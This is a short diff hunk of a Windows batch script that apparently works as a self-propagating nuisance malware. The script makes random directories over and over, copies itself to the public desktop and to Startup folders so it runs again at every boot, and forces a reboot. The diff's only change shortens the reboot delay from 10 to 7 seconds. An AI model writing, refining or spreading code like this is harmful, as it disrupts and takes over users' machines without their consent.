@@ -11,7 +11,7 @@ md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
-shutdown /r /t 10 
+shutdown /r /t 7 
 copy %0 "C:\Users\Public\Desktop"
 copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 copy %0 "C:\Documents and Settings\All Users\Windows\Start Menu\Programs\Startup"
